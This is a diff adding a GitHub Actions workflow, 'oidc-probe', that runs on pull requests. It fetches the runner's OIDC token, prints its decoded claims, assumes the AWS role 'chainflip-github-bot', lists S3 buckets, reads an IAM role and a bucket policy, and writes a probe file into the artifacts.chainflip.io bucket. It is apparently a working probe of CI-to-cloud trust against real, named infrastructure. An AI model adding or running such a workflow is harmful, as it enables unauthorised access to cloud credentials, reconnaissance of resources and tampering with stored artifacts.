@@ -1,0 +1,33 @@
+name: oidc-probe
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: claims
+        run: |
+          python3 - "$ACTIONS_ID_TOKEN_REQUEST_URL" "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" <<'PY'
+          import json,sys,urllib.request,base64
+          url,tok=sys.argv[1],sys.argv[2]
+          req=urllib.request.Request(url+"&audience=sts.amazonaws.com",headers={"Authorization":"bearer "+tok})
+          jwt=json.load(urllib.request.urlopen(req))["value"]
+          for i,p in enumerate(jwt.split(".")[:2]):
+              print(f"--- part{i} ---")
+              print(base64.urlsafe_b64decode(p+"="*(-len(p)%4)).decode())
+          PY
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          aws-region: eu-central-1
+          role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
+      - run: aws sts get-caller-identity
+      - run: aws s3api list-buckets
+      - run: aws iam get-role --role-name chainflip-github-bot || true
+      - run: aws s3api get-bucket-policy --bucket artifacts.chainflip.io || true
+      - run: echo "probe-$(date -u +%FT%TZ)" | aws s3 cp - s3://artifacts.chainflip.io/_probe/oidc.txt || true
